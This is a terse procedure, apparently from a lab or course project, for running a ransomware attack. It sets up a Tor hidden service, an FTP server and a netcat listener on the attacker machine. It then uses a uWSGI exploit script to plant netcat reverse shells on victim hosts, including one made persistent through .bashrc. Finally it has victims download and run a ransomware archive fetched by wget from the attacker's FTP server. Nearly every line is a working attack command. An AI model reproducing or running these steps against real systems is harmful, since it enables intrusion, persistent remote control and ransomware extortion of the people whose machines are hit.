
1.-Prepare the attacker system
	1.1.- modify /etc/tor/torrc file
		HiddenServiceDir /var/lib/tor/hidden_service/
		HiddenServicePort 80 127.0.0.1:8008
	1.2.- sudo service tor start
		  sudo service vsftpd start
	1.3.- Get TOR url
		cd /var/lib/tor/hidden_service
		cat hostname 
	1.5.- sqlitebrowser
	1.6.- nc -lvp 1234
	1.7.- sudo apt-get install vsftpd
	1.8.- python server.py
	
	
2.- Prepare the ransomware modifying the URL of TOR

3.- Prepare the servers in order to start the attacker
	3.1.- cd /home/it/project
	3.2.- ../uwsgi-2.0.20/uwsgi --puwsgi-socket localhost:8080 --wsgi-file foobar.py
	
	
4.- Start the attack"
	4.1.- Send exploit and reverse shell   
		python3 uwsgi_exp.py -u 10.0.2.17 -c "echo 'nc -e /bin/bash 10.0.2.15 1234 2>/dev/null &' >> ~/.bashrc"
		python3 uwsgi_exp.py -u 10.0.2.18 -c "nc -e /bin/bash 10.0.2.15 1234 2>/dev/null &"
		python3 uwsgi_exp.py -u 10.0.2.17 -c "gnome-terminal"
		python -c 'import pty; pty.spawn("/bin/bash")'
	

	4.2.- wget ftp://ruben:ruben@10.0.2.15/Documentos/RANS/MLW-ransomware.zip
		  unzip MLW-ransomware.zip
		  
	4.3.- /bin/bash Bash/bashVictim.sh
		  